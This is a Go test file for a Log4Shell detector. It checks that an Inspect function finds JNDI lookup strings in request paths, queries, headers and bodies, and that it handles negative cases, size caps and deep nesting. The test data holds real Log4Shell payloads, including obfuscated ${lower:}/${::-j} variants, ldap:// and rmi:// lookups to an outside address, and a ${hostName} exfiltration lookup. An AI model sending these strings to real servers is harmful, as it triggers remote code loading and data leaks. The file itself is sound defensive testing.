package log4shell

import (
	"net/http"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestInspectObfuscation(t *testing.T) {
	tests := []struct {
		name, ua, resolved string
	}{
		{"plain", "${jndi:ldap://203.0.113.9:1389/a}", ""},
		{"lower", "${${lower:j}ndi:${lower:l}dap://203.0.113.9/a}", "jndi:ldap://203.0.113.9/a"},
		{"upper", "${${upper:j}${lower:N}di:rmi://203.0.113.9/a}", "Jndi:rmi://203.0.113.9/a"},
		{"default", "${${::-j}${::-n}${::-d}${::-i}:${::-l}dap://203.0.113.9/a}", "jndi:ldap://203.0.113.9/a"},
		{"env default", "${${env:NaN:-j}ndi${env:NaN:-:}ldap://203.0.113.9/a}", "jndi:ldap://203.0.113.9/a"},
		{"nested host", "${jndi:ldap://${hostName}.x.example/a}", ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			h := http.Header{"User-Agent": {tt.ua}}
			got := Inspect("/", "", h, nil)
			require.NotNil(t, got)
			require.Len(t, got.Lookups, 1)
			require.Equal(t, "header:User-Agent", got.Lookups[0].Location)
			require.Equal(t, tt.ua, got.Lookups[0].Raw)
			if tt.resolved != "" {
				require.Equal(t, tt.resolved, got.Lookups[0].Resolved)
			}
		})
	}
}

func TestInspectLocations(t *testing.T) {
	got := Inspect("/%24%7Bjndi:ldap://203.0.113.9/p%7D", "q=%24%7Bjndi:dns://203.0.113.9%7D",
		http.Header{"X-Api-Version": {"${jndi:ldap://203.0.113.9/h}"}},
		[]byte("user=%24%7Bjndi:ldap://203.0.113.9/b%7D"))
	require.NotNil(t, got)
	var locs []string
	for _, l := range got.Lookups {
		locs = append(locs, l.Location)
	}
	require.ElementsMatch(t, []string{"path", "query", "header:X-Api-Version", "body"}, locs)
	require.False(t, got.Truncated)
}

func TestInspectNegative(t *testing.T) {
	for _, v := range []string{"", "${env:HOME}", "${jndi", "${jndi:ldap://x", "$ {jndi:x}", "${lower:abc}", "{jndi:ldap://x}"} {
		require.Nil(t, Inspect("/", "", http.Header{"User-Agent": {v}}, []byte(v)), v)
	}
}

func TestInspectCaps(t *testing.T) {
	var b strings.Builder
	for i := 0; i < MaxLookups+5; i++ {
		b.WriteString("${jndi:ldap://203.0.113.9/")
		b.WriteString(strings.Repeat("a", i+1))
		b.WriteString("}")
	}
	got := Inspect("/", "", nil, []byte(b.String()))
	require.Len(t, got.Lookups, MaxLookups)
	require.True(t, got.Truncated)

	long := "${jndi:ldap://203.0.113.9/" + strings.Repeat("a", 2*MaxExpression) + "}"
	got = Inspect("/", "", nil, []byte(long))
	require.Len(t, got.Lookups[0].Raw, MaxExpression)
	require.True(t, got.Truncated)

	// Unbounded nesting must not hang or recurse forever.
	deep := strings.Repeat("${", 5000) + "jndi:x" + strings.Repeat("}", 5000)
	_ = Inspect("/", "", nil, []byte(deep))
}
